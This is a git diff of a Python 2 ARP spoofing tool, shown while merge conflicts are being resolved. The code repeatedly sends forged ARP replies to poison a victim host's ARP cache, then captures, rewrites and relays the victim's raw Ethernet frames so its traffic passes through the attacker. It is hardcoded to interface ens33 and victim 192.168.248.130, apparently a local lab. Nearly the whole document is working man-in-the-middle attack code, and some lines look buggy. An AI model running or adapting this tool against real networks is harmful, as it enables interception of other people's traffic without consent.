@@ -2,12 +2,9 @@ from socket import *
 from struct import pack,unpack
 from collections import OrderedDict
 from os import popen
-from multiprocessing
 
-<<<<<<< HEAD
+
 import time
-=======
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
 import sys
 import threading
 
@@ -46,17 +43,12 @@ def getMyIP():
 def getMacByIP(iface, ip):
     ''' Get mac address by ip using arp broadcast '''
     response = ARP(iface).sendrecvarp( "REQUEST", target_mac="ff:ff:ff:ff:ff:ff", target_ip=ip )
-<<<<<<< HEAD
-    # print 'getmacbyip : ', response['arp']['psrc'], ip
-=======
-    print response['arp']['psrc'], ip
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
     if response['arp']['psrc'] == ip:
         return response['arp']['hwsrc']
 
 def getGWIP():
     ''' Get default gateway IP for a local interface '''
-    return popen("route|grep default|awk '{print $2}'").read()
+    return popen("route|grep default|awk '{print $2}'").read().split('\n')[0]
 
 
 class ARP:
@@ -86,7 +78,6 @@ class ARP:
         packet_frame['hwdst']  = mac2str(   self.target_mac if target_mac is None else target_mac )
         packet_frame['pdst']   = inet_aton( self.target_ip  if target_ip  is None else target_ip )
 
-        # print packet_frame
         packet = b"".join( packet_frame.values() )
         s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
         try:
@@ -96,10 +87,6 @@ class ARP:
 
         except Exception, e:
             sys.exit( e )
-<<<<<<< HEAD
-=======
-
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
 
     def sendrecvarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None, retry=0):
         ''' send arp packet and recv arp packet '''
@@ -114,7 +101,6 @@ class ARP:
             thread.start()
             response = self.parseHeader( s.recvfrom(1024)[0] )
             thread.join()
-            # print response
             s.close()
 
             if response['arp']['hwdst']==self.sender_mac and response['arp']['pdst']==self.sender_ip :
@@ -146,14 +132,9 @@ class ARP:
 class Sniff(ARP):
     def __init__(self, arp, victim_ip):
         self.victim_ip  = victim_ip
-<<<<<<< HEAD
         self.victim_mac = getMacByIP( arp.iface, self.victim_ip )
         self.router_ip  = getGWIP()
-        # self.router_mac = getMacByIP( arp.iface, getGWIP() )
-        self.router_mac= getMacByIP( arp.iface, '192.168.248.2' )
-        print 'victim mac : ',self.victim_mac
-        print self.router_mac
-
+        self.router_mac = getMacByIP( arp.iface, getGWIP() )
 
     def run(self):
         poison_thread = threading.Thread( target=self.poison, args=() )
@@ -166,8 +147,8 @@ class Sniff(ARP):
         relay_thread.join()
 
         
-
     def poison(self, interval=3):
+        ''' arp table poisoning '''
         while True:
             arp.sendarp(
                 op         = 'REPLY',
@@ -175,55 +156,14 @@ class Sniff(ARP):
                 target_mac = self.victim_mac, 
                 target_ip  = self.victim_ip
                 )
-            # arp.sendarp(
-            #     op         = 'REPLY',
-            #     sender_ip  = self.victim_ip,
-            #     target_mac = getMacByIP( arp.iface, self.router_ip ),
-            #     target_ip  = self.router_ip
-            #     )
-            # arp.sendarp(
-            #     op         = 'REPLY',
-            #     sender_mac = '12:34:12:34:12:34',
-            #     sender_ip  = '192.168.248.128',
-            #     target_mac = getMacByIP( arp.iface, self.victim_ip ), 
-            #     target_ip  = self.victim_ip
-            #     )
             time.sleep( interval )
-=======
-        self.router_ip  = getGWIP()
-        self.router_mac = getMacByIP( self.router_ip )
 
-    def run(self):
-        thread = Threading.Thread( target=self.relay, args=(,))
-        thread.start()
-
-    def poison(self):
-        arp.sendarp(
-            op         = 'REPLY',
-            sender_ip  = self.router_ip,
-            target_mac = getMacByIP( arp.iface, self.victim_ip ),
-            target_ip  = self.victim_ip
-            )
-        # arp.sendarp(
-        #     op         = 'REPLY',
-        #     sender_ip  = self.victim_ip,
-        #     target_mac = getMacByIP( arp.iface, self.router_ip ),
-        #     target_ip  = self.router_ip
-        #     )
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
-    
     def restorePacketHeader(self, packet):
         ''' restore ethernet dst mac header '''
         restored_packet  = mac2str( self.router_mac )
-<<<<<<< HEAD
         restored_packet += packet[6:]
         return restored_packet
-=======
-        restored_packet += packet
-        return restored_packet
         
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
-
 
     def relay(self):
         recv_s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
@@ -231,17 +171,9 @@ class Sniff(ARP):
         send_s.bind(( arp.iface, SOCK_RAW ))
         while True:
             packet = recv_s.recvfrom(1024)[0]
-<<<<<<< HEAD
             header = ARP.parseHeader( packet )
-            # if header['arp']['pdst'] == self.router_ip and header['arp']['hwdst'] == getMyMac():
             try:
-                # ignore arp packet
-                if header['ether']['type'] == ETHERTYPE_ARP:
-                    print "\nARP PACKET\n"
-                    continue
 
-                print 'ether, mac : ', header['ether']['dst'], getMyMac(arp.iface)
-                print 'hwsrc, victim_mac', header['ether']['src'], self.victim_mac
                 # if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac:
                 if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac or header['ether']['src']=='00:50:56:c0:00:08':
                     print '\n\nPACKET SEND\n\n'
@@ -255,56 +187,22 @@ class Sniff(ARP):
             print '--------------------------------------------'
             print "dst", header['ether']['dst']
             print 'src', header['ether']['src']
-            print 'type %x' % header['ether']['type']
+            print 'type 0x%x' % header['ether']['type'] & 0xffff
             print 'packet', `packet`[:50]
             print 'protocol', u8( packet[23] )
             print '--------------------------------------------'
-=======
-            header = arp.parseArpHeader( packet )
-            # if header['arp']['pdst'] == self.router_ip and header['arp']['hwdst'] == getMyMac():
-            
-            # ignore arp packet
-            if header['ether']['type'] == ETHERTYPE_ARP:
-                continue
 
-            packet = self.restorePacket( packet )         
-            send_s.send( packet )
-
-
-
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
-
-if __name__ == '__main__':
-
-<<<<<<< HEAD
 if __name__ == '__main__':
     arp = ARP("ens33")
-    # print getMacByIP( "ens33", "192.168.248.2")
     sniff = Sniff( arp, '192.168.248.130' )
     sniff.run()
 
         
 '''
-0000   00 50 56 e2 ad 1c 00 0c 29 19 fc d7 00 0c 29 4c
-0010   ae cf 08 00 45 00 00 54 9e 70 40 00 40 01 d2 fd
-0020   c0 a8 f8 82 08 08 08 08 08 00 7f d0 2a 77 00 05
-0030   a1 d8 71 5b 4f 7c 00 00 08 09 0a 0b 0c 0d 0e 0f
-0040   10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
-0050   20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f
-0060   30 31 32 33 34 35 36 37 a1 d8 71 5b 4f 7c 00 00
-0070   08 09 0a 0b 0c 0d
+route
 
 192.168.248.1            ether   00:50:56:c0:00:08   C                     ens33
 192.168.248.2            ether   00:50:56:e2:ad:1c   C                     ens33
 192.168.248.254          ether   00:50:56:f3:89:f6   C                     ens33
 192.168.248.130          ether   00:0c:29:4c:ae:cf   C                     ens33
-
-
-00:50:56:c0:00:08
 '''
-=======
-    arp = ARP("ens33")
-
-    sniff = Sniff( arp, '192.168.248.130' )
-    sniff.poison()
->>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
